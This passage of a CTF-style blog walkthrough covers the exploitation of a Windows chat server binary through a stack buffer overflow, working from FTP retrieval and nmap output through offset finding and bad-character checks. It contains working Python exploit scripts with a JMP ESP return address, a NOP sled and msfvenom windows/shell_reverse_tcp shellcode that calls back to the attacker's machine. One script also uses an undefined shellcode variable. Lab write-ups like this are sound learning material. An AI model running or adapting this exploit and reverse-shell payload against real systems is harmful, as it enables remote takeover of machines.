+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  System_Time: <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span>T04:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">48</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span>cert: Subject: commonName<span style="color:#f92672">=</span>brainstorm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Not valid before: <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span>T03:<span style="color:#ae81ff">52</span>:<span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_Not valid after:  <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span>T03:<span style="color:#ae81ff">52</span>:<span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span>date: <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span>T04:<span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">19</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>s <span style="color:#f92672">from</span> scanner time<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9999</span><span style="color:#f92672">/</span>tcp open  abyss<span style="color:#960050;background-color:#1e0010">?</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:<span style="color:#f92672">/</span>o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">216.80</span> seconds
+</span></span></code></pre></div><p>First thing I noticed was Port 21 <code>ftp</code> was open with the anonymous FTP login
+enabled. I checked it out by running <code>ftp 10.10.37.33</code> with the name
+<code>anonymous</code>.</p>
+<p>When I tried to <code>ls</code> the ftp server, it prompted <code>229 Entering Extended Passive Mode (|||49178|)</code>. Simply you need to type <code>passive</code>to turn the passive mode
+off. After that, I was able to spot the <code>chatserver</code> directory. Moving into the
+directory, there were two files <code>chatserver.exe</code> and <code>essfunc.dll</code>. I learned
+that when you download a binary from a ftp server, you would want to turn on the
+binary option to make sure the files do not get corrupted while being
+transferred. I ran <code>binary</code> and <code>prompt OFF</code> (to turn off the prompt asking yes
+or no) then ran <code>mget *</code> to download all the files.</p>
+<p>To move files between the guest VMs in VirtualBox, I used <code>File Manager</code>
+functionality which allows you to move files between the host and the guest</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=wYe0UOQwWzI">link</a>.</li>
+</ul>
+<p>I prepared two VMs: Kali, Windows and set up the networking between them. I
+followed this write-up -
+<a href="https://www.makeuseof.com/how-network-two-virtual-machines-with-virtualbox/"> https://www.makeuseof.com/how-network-two-virtual-machines-with-virtualbox/</a></p>
+<h2 id="reverse-engineering-a-windows-binary">Reverse engineering a Windows binary<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-a-windows-binary">#</a></h2>
+<p>For this task, the write-up suggests the Immunity Debugger and Mona python
+script. In short, buffer overflow is a way to control the flow of code execution
+by overwriting the EIP register which stores the memory address of the next
+instruction to be executed. If we are able to overwrite this register with the
+memory address of our choice, we can do many interesting things!</p>
+<p>After installing the immunity debugger and loading the chatserver executable,
+you will see something like this:</p>
+<p><img alt="immunity-debugger.png" loading="lazy" src="/images/immunity-debugger.png"></p>
+<p>When trying to exploit a buffer overflow vulnerability, one would try to input a
+bunch of bytes to see if we can break the program. So what I did was to create a
+cyclic pattern of 5000 bytes and sent it to the chatserver program. I used
+<code>pwntools</code> which is a CTF framework written in Python - it has a lot of useful
+tools (you can install it through <code>pip</code>). To create 5000 bytes of cyclic
+pattern, <code>pwn cyclic 5000</code>. The I copied and pasted the cyclic pattern and
+passed them as the input message for the program. The program crashed and the
+immunity debugger showed this:</p>
+<p><img alt="immunity-result-5000.png" loading="lazy" src="/images/immunity-result-5000.png"></p>
+<p>As we can see, the EIP register is now 75616164 (in hex) and we can use these
+four bytes to find the offset from the beginning of the input buffer to the
+beginning of the EIP register. That can be done by running <code>pwn cyclic -l 0x75616164</code>. This gave me 2012 meaning we would need some random 2012 bytes
+before actually overwriting the first byte of the EIP register. So, if we send
+2012 bytes of something plus <code>BBBB</code>, the EIP should end up being <code>0x42424242</code>.</p>
+<p>We can automate the process by creating a python script that would do the job
+for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hello&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2012</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.0.2.15&#39;</span>
+</span></span><span style="display:flex;"><span>target_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Sending payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((target_ip, target_port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(username <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># &#39;\r\n&#39; -&gt; return + new line : hitting enter, a single \n might do the job</span>
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Cannot connect to the server&#34;</span>)
+</span></span></code></pre></div><p>Now this script should do the same thing as what we were doing in the terminal. The next step is to find the bad characters that might exist in the program. We need to find them to prevent any issues that could arise from our shellcode not working. For example, <code>x00</code> is one of the bad characters, which is a null character - it terminates the byte stream.</p>
+<ul>
+<li><a href="https://github.com/cytopia/badchars">https://github.com/cytopia/badchars</a>
+<ul>
+<li>Useful resource for badchars</li>
+</ul>
+</li>
+</ul>
+<p>After visiting the Github page, I modified the script above to send them with the payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hello&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2012</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.0.2.15&#39;</span>
+</span></span><span style="display:flex;"><span>target_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>badchars <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Sending payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((target_ip, target_port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(username <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># &#39;\r\n&#39; -&gt; return + new line : hitting enter, a single \n might do the job</span>
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(payload <span style="color:#f92672">+</span> badchars <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Cannot connect to the server&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Sending payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((target_ip, target_port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(username <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># &#39;\r\n&#39; -&gt; return + new line : hitting enter</span>
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(payload <span style="color:#f92672">+</span> shellcode <span style="color:#f92672">+</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Cannot connect to the server&#34;</span>)
+</span></span></code></pre></div><p>After running the script again (make sure you re-launch the program in the
+debugger), you can right-click the value of ESP register and click <code>Follow in Dump</code>. I was able to see the bad characters I sent along with the payload:</p>
+<p><img alt="badcahrs-in-esp.png" loading="lazy" src="/images/badcahrs-in-esp.png"></p>
+<p>We can see the start of the badchars <code>01 02 03 ... 9E 0F A0</code>. As I mentioned
+earlier, we can use <code>mona</code> with the debugger to make our lives a bit easier. I
+found this
+<a href="https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/characters.md">article</a>
+and
+<a href="https://int0x33.medium.com/day-71-essential-immunity-commands-for-oscp-and-ctfs-cebfe06d935a">this</a> that
+walk through how to use moan with the debugger.</p>
+<p>According to the second article, first we need to set the base directory for
+<code>mona</code> by running <code>!mona config -set workingfolder C:\mona</code>and run <code>!mona bytearray -cpb \x00</code>. This will generate files <code>bytearray.txt</code> and
+<code>bytearray.bin</code> in the base directory and we can use them to compare the current
+badchars sequence that we passed into the program.</p>
+<p>Running this command <code>!mona compare -a esp -f C:\mona\bytearray.bin</code> will tell
+you if there are any bad characters. After running it, I got this result:</p>
+<p><img alt="no-bad-char.png" loading="lazy" src="/images/no-bad-char.png"></p>
+<p>So, other than the null byte, we could use all the bytes to create a shellcode.
+The next thing we need to do is to check if there are any protection mechanisms
+in place. You can check it easily by running <code>!monal modules</code>. The result of the
+run looks like this:</p>
+<p><img alt="mona-moduels.png" loading="lazy" src="/images/mona-moduels.png"></p>
+<p>What we want to look at is the lines that have all <code>False</code> columns and there are
+two: <code>chatserver.exe</code> and <code>essfunc.dll</code> (the dll library we downloaded from the
+ftp server).</p>
+<p>I learned that, just like how we would try to find gadgets from ELF files in
+Linux, we need to find an instruction that allows us to jump to ESP so we can
+redirect the code flow to our shellcode. <code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code> is the command we want to run: <code>\xff\xe4</code> is the byte instruction
+for <code>JMP ESP</code>.</p>
+<p><img alt="find-jmp-esp.png" loading="lazy" src="/images/find-jmp-esp.png"></p>
+<p>There were several <code>JMP ESP</code> instructions in the dll file. Let&rsquo;s say I am going
+to use the address of <code>0x625014df</code>. When we use this address in our script, this
+address needs to be entered in little-endian order. Now we need to create a
+shellcode.</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_vm_ip&gt; LPORT=&lt;kali_vm_port&gt; -b &quot;\x00&quot; -f c</code></p>
+<p>This is a shellcode written in C (<code>-f c</code>) and it specifies the bad character
+(<code>-b &quot;\x00&quot;</code>). After copying and pasting the shellcode to the script file, it
+looks like this now:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hello&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.0.2.15&#39;</span>
+</span></span><span style="display:flex;"><span>target_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jmp_esp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xdf\x14\x50\x62</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2012</span> <span style="color:#f92672">+</span> jmp_esp <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#75715e"># adding a few nop instructions</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xc1\xbf\x36\x67\xf6\xf3\xd9\x74\x24\xf4\x5a\x31\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\xdc\x9b\x14\x06\xdc</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8c\x5b\xe9\x1c\x4d\x3c\x63\xf9\x7c\x7c\x17\x8a\x2f\x4c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\xde\xc3\x27\x31\xca\x50\x45\x9e\xfd\xd1\xe0\xf8\x30</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x59\x38\x53\x61\xa0\x6d\xb3\x58\x6b\x60\xb2\x9d\x96</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe6\x76\xdc\x3c\x16\xf2\xa8\xfc\x9d\x48\x3c\x85\x42</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x3f\xa4\xd5\x12\x66\x66\xd4\xf7\x12\x2f\xce\x14\x1e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf9\x65\xee\xd4\xf8\xaf\x3e\x14\x56\x8e\x8e\xe7\xa6\xd7</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x29\x18\xdd\x21\x4a\xa5\xe6\xf6\x30\x71\x62\xec\x93\xf2</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd4\xc8\x22\xd6\x83\x9b\x29\x93\xc0\xc3\x2d\x22\x04\x78</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x49\xaf\xab\xae\xdb\xeb\x8f\x6a\x87\xa8\xae\x2b\x6d\x1e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xce\x2b\xce\xff\x6a\x20\xe3\x14\x07\x6b\x6c\xd8\x2a\x93</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6c\x76\x3c\xe0\x5e\xd9\x96\x6e\xd3\x92\x30\x69\x14\x89</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\xe5\xeb\x32\xf6\x2c\x28\x66\xa6\x46\x99\x07\x2d\x96</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x26\xd2\xe2\xc6\x88\x8d\x42\xb6\x68\x7e\x2b\xdc\x66\xa1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4b\xdf\xac\xca\xe6\x1a\x27\xff\xf6\x26\xb3\x97\xf4\x26</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbf\xb5\x70\xc0\xd5\x29\xd5\x5b\x42\xd3\x7c\x17\xf3\x1c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x52\x33\x96\x58\xa3\xfa\x5f\x14\xb7\x6b\x90\x63\xe5</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3a\xaf\x59\x81\xa1\x22\x06\x51\xaf\x5e\x91\x06\xf8\x91</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe8\xc2\x14\x8b\x42\xf0\xe4\x4d\xac\xb0\x32\xae\x33\x39</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb6\x8a\x17\x29\x0e\x12\x1c\x1d\xde\x45\xca\xcb\x98\x3f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\xa5\x72\x93\x16\x21\x02\xdf\xa8\x37\x0b\x0a\x5f\xd7</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\xe3\x26\xe8\x73\x64\xaf\x91\x69\x14\x50\x48\x2a\x24</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b\xd0\x1b\xad\xc2\x81\x19\xb0\xf4\x7c\x5d\xcd\x76\x74</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1e\x2a\x66\xfd\x1b\x76\x20\xee\x51\xe7\xc5\x10\xc5\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcc</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Sending payload...&#34;</span>)
